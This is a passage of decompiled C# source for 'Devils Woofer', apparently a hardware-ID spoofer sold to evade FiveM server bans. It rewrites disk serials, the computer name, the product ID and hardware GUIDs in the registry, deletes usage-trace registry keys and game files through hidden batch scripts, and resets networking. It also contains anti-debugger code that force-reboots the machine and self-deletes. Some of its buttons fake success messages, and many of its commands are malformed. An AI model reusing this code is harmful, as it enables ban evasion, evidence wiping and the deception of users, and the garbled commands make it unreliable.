				streamWriter.WriteLine("taskkill /f /im Steam.exe /t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath=%windir%\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\steam_api64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\DigitalEntitlements");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc LeanV2");
				streamWriter.WriteLine("cls");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			MessageBox.Show("Spoofed Windows Info!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00006CB0 File Offset: 0x00004EB0
		public static string RandomId(int length)
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			string text2 = "";
			Random random = new Random();
			for (int i = 0; i < length; i++)
			{
				text2 += text[random.Next(text.Length)].ToString();
			}
			return text2;
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00006D10 File Offset: 0x00004F10
		public static void Disk()
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					bool flag = registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral";
					if (flag)
					{
						string text3 = Main.RandomId(14);
						string text4 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(text4));
						registryKey.SetValue("Identifier", text3);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(text3));
						registryKey.SetValue("SerialNumber", text4);
					}
				}
			}
			foreach (string str in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
			{
				Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + str, true).SetValue("Identifier", Main.RandomId(8) + "-" + Main.RandomId(8) + "-A");
			}
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00006EBF File Offset: 0x000050BF
		private void siticoneRoundedButton3_Click(object sender, EventArgs e)
		{
			Main.Disk();
			MessageBox.Show("Spoofed Disk!", "Devils Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00006EDC File Offset: 0x000050DC
		public static string GenerateString(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = "ABCDEF0123456789"[Main.random.Next("ABCDEF0123456789".Length)];
			}
			return new string(array);
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00006F2E File Offset: 0x0000512E
		private void siticoneRoundedButton8_Click(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			MessageBox.Show("Spoofed Xbox!", "Devils Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00006F50 File Offset: 0x00005150
		public static void SpoofPCName()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
			registryKey.SetValue("ComputerName", "DESKTOP-" + Main.GenerateString(6));
			registryKey.Close();
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00006F9C File Offset: 0x0000519C
		private void siticoneRoundedButton6_Click(object sender, EventArgs e)
		{
			Main.SpoofPCName();
			DialogResult dialogResult = MessageBox.Show("Name Spoofed, Do you want to restart your PC Now?", "Devils Woofer", MessageBoxButtons.YesNo);
			bool flag = dialogResult == DialogResult.Yes;
			if (flag)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
			}
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00006FFC File Offset: 0x000051FC
		private static void hwid()
		{
			try
			{
				Process process = new Process();
				process.StartInfo.Arguments = "netsh advfirewall firewall delete rule name = fivem_b2545_gtaprocess.exe";
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				process.WaitForExit();
				MessageBox.Show("Enabled");
			}
			catch
			{
				MessageBox.Show("There was an error, try again later", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00007090 File Offset: 0x00005290
		private void siticoneRoundedButton5_Click(object sender, EventArgs e)
		{
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
			MessageBox.Show("PrID Changed To: " + Main.CurrentProductID(), "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600006E RID: 110 RVA: 0x00007134 File Offset: 0x00005334
		public static string CurrentProductID()
		{
			string text = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
			string text2 = "ProductID";
			string result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(text))
				{
					bool flag = registryKey2 == null;
					if (flag)
					{
						throw new KeyNotFoundException(string.Format("Key Not Found: {0}", text));
					}
					object value = registryKey2.GetValue(text2);
					bool flag2 = value == null;
					if (flag2)
					{
						throw new IndexOutOfRangeException(string.Format("Index Not Found: {0}", text2));
					}
					result = value.ToString();
				}
			}
			return result;
		}

		// Token: 0x0600006F RID: 111 RVA: 0x000030F6 File Offset: 0x000012F6
		private void label6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000070 RID: 112 RVA: 0x000030F6 File Offset: 0x000012F6
		private void settingspanel_Paint_2(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000071 RID: 113 RVA: 0x000071F8 File Offset: 0x000053F8
		private void siticoneLabel8_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/devilwoofer");
		}

		// Token: 0x06000072 RID: 114 RVA: 0x000030F6 File Offset: 0x000012F6
		private void siticoneRoundedButton12_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00007208 File Offset: 0x00005408
		public static void InstallDate()
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("InstallDate", value);
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00007245 File Offset: 0x00005445
		private void siticoneRoundedButton10_Click(object sender, EventArgs e)
		{
			Main.InstallDate();
			MessageBox.Show("Spoofed Last Logs ", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000075 RID: 117 RVA: 0x00007264 File Offset: 0x00005464
		private static void DimisProtection()
		{
			Process[] processesByName = Process.GetProcessesByName("dnSpy");
			bool flag = processesByName.Length == 0;
			if (!flag)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName2 = Process.GetProcessesByName("ida64");
			bool flag2 = processesByName2.Length == 0;
			if (!flag2)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName3 = Process.GetProcessesByName("64dbg");
			bool flag3 = processesByName3.Length == 0;
			if (!flag3)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName4 = Process.GetProcessesByName("ollydbg");
			bool flag4 = processesByName4.Length == 0;
			if (!flag4)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName5 = Process.GetProcessesByName("x32dbg");
			bool flag5 = processesByName5.Length == 0;
			if (!flag5)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName6 = Process.GetProcessesByName("MasterDumper");
			bool flag6 = processesByName6.Length == 0;
			if (!flag6)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x000074EC File Offset: 0x000056EC
		private void siticoneRoundedButton14_Click(object sender, EventArgs e)
		{
			bool flag = File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe");
			if (flag)
			{
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			}
			bool flag2 = File.Exists("C:\\Program Files\\Unlisted\\change.bat");
			if (flag2)
			{
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			}
			string text = this.diskname.Text;
			string path = "C:\\Program Files\\Unlisted";
			bool flag3 = !Directory.Exists(path);
			if (flag3)
			{
				Directory.CreateDirectory(path);
			}
			bool flag4 = File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe");
			if (flag4)
			{
				string text2 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter = File.CreateText(text2))
				{
					streamWriter.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process = new Process();
				process.StartInfo.FileName = text2;
				this.processlist.Add(process);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process.Start();
				MessageBox.Show("Spoofed NVME Disk!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
			else
			{
				Thread.Sleep(500);
				string text3 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.processlist.Add(process2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process2.Start();
				MessageBox.Show("Spoofed NVME Disk!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
		}

		// Token: 0x06000077 RID: 119 RVA: 0x000030F6 File Offset: 0x000012F6
		private void premiumpanel_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00007744 File Offset: 0x00005944
		private void siticoneRoundedButton12_Click_1(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			MessageBox.Show("Unlinked All Services!", "Devils Woofer Premium", MessageBoxButtons.OK);
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00007764 File Offset: 0x00005964
		private void siticoneRoundedButton11_Click_1(object sender, EventArgs e)
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					bool flag = registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral";
					if (flag)
					{
						string text3 = Main.RandomId(14);
						string text4 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(text4));
						registryKey.SetValue("Identifier", text3);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(text3));
						registryKey.SetValue("SerialNumber", text4);
					}
				}
			}
			foreach (string str in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
			{
				Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + str, true).SetValue("Identifier", Main.RandomId(8) + "-" + Main.RandomId(8) + "-A");
			}
			MessageBox.Show("Spoofed Nvme Disk!", "Devils Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00007924 File Offset: 0x00005B24
		private void siticoneRoundedButton19_Click(object sender, EventArgs e)
		{
			Main.NetWoof();
			Thread.Sleep(2500);
			MessageBox.Show("Spoofed Local netCache!", "Devils Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x0600007B RID: 123 RVA: 0x0000794C File Offset: 0x00005B4C
		private void siticoneRoundedButton13_Click(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			Main.NetWoof();
			bool flag = File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe");
			if (flag)
			{
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			}
			bool flag2 = File.Exists("C:\\Program Files\\Unlisted\\change.bat");
			if (flag2)
			{
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			}
			string text = this.diskname.Text;
			string path = "C:\\Program Files\\Unlisted";
			bool flag3 = !Directory.Exists(path);
			if (flag3)
			{
				Directory.CreateDirectory(path);
			}
			bool flag4 = File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe");
			if (flag4)
			{
				string text2 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter = File.CreateText(text2))
				{
					streamWriter.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process = new Process();
				process.StartInfo.FileName = text2;
				this.processlist.Add(process);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process.Start();
				MessageBox.Show("Spoofed NVME Disk!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
			else
			{
				Thread.Sleep(500);
				string text3 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.processlist.Add(process2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process2.Start();
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
			Main.HWIDclick();
			string path2 = "C:\\Program Files\\Win64";
			bool flag5 = !Directory.Exists(path2);
			if (flag5)
			{
				Directory.CreateDirectory(path2);
			}
			bool flag6 = File.Exists("C:\\Program Files\\Win64\\net.bat");
			if (flag6)
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text4 = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter3 = File.CreateText(text4))
				{
					streamWriter3.WriteLine("netsh int ip reset");
				}
				Process process3 = new Process();
				process3.StartInfo.FileName = text4;
				this.processlist.Add(process3);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process3.Start();
			}
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.FiveM();
			Main.New();
			Thread.Sleep(2000);
			MessageBox.Show("Spoofed FiveM Server Bans, Use new steam, rockstar and unlink discord (might need a vpn)", "Devils Woofer Premium", MessageBoxButtons.OK);
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00007C98 File Offset: 0x00005E98
		private void LogoutPanelButton_Click_1(object sender, EventArgs e)
		{
			this.premiumpanel.BringToFront();
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00007CA8 File Offset: 0x00005EA8
		private void siticoneButton2_Click(object sender, EventArgs e)
		{
			bool flag = File.Exists("C:\\Program Files\\leanuser.txt");
			if (flag)
			{
				File.Delete("C:\\Program Files\\leanuser.txt");
			}
			bool flag2 = File.Exists("C:\\Program Files\\leanpass.txt");
			if (flag2)
			{
				File.Delete("C:\\Program Files\\leanpass.txt");
			}
			MessageBox.Show("Deleted Saved Logins!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00007C98 File Offset: 0x00005E98
		private void siticoneRoundedButton7_Click_1(object sender, EventArgs e)
		{
			this.premiumpanel.BringToFront();
		}

		// Token: 0x0600007F RID: 127 RVA: 0x000030F6 File Offset: 0x000012F6
		private void siticoneRoundedButton7_Click_2(object sender, EventArgs e)
		{
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00007CFF File Offset: 0x00005EFF
		private void siticoneRoundedButton15_Click(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			MessageBox.Show("Boosted Your System!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000081 RID: 129 RVA: 0x000030F6 File Offset: 0x000012F6
		private void siticoneOSToggleSwith1_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000082 RID: 130 RVA: 0x000030F6 File Offset: 0x000012F6
		private void siticoneRoundedButton11_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00007D20 File Offset: 0x00005F20
		public static void NetWoof()
		{
			List<Process> list = new List<Process>();
			string path = "C:\\Program Files\\Win64";
			bool flag = !Directory.Exists(path);
			if (flag)
			{
				Directory.CreateDirectory(path);
			}
			bool flag2 = File.Exists("C:\\Program Files\\Win64\\net.bat");
			if (flag2)
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
				File.Delete("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine("netsh int ip reset");
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				list.Add(process);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process.Start();
				Thread.Sleep(500);
				File.Delete("C:\\Program Files\\Win64\\net.bat");
			}
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00007E04 File Offset: 0x00006004
		public static void HWIDclick()
		{
			string keyName = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
			string text = (string)Registry.GetValue(keyName, "HwProfileGuid", "default");
			string value = string.Concat(new string[]
			{
				"{LeanOnTop-",
				Main.GenID(5),
				"-",
				Main.GenID(5),
				"-",
				Main.GenID(4),
				"-",
				Main.GenID(9),
				"}"
			});
			Registry.SetValue(keyName, "GUID", value);
			Registry.SetValue(keyName, "HwProfileGuid", value);
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00007EA4 File Offset: 0x000060A4
		public static void XBOXclick()
		{
			string value = Main.GenerateDate(8);
